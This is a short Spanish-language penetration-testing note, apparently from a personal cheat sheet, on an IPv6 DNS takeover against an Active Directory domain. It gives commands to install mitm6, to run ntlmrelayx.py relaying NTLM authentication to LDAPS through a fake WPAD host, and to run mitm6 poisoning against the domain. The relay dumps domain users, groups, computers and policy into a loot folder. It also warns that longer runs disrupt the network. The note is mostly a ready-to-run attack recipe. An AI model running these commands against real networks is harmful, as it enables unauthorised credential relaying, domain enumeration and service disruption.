# IPv6 DNS Takeover via mitm6 

Tags: #AD #Attacks #IPv6 #DNS 

**Nota:** Este ataque solo se puede ejecutar en periodos cortos de 5 - 10 minutos. Ya que con mas tiempo este puede causar una interrupción en la red. 

```bash 
# Instalacion de mitm6
❯ cd /opt/mitm6
❯ pip2 install .
```

```bash 
1. Ejecutar la herramienta para aplicar el SMB Relay para IPv6
❯ ntlmrelayx.py -6 -t ldaps://IP -wh fakewpad.Domain.local -l lootme   # Nos creara un folder llamado 'loopme' donde podemos ver el 'LDAP Domain' que incluye: domain_computers, domain_groups, domain_policy, domain_users, etc...

2. Ejecutar el comando para ver eventos en el dominio
❯ mitm6 -d Domain.local 
``` 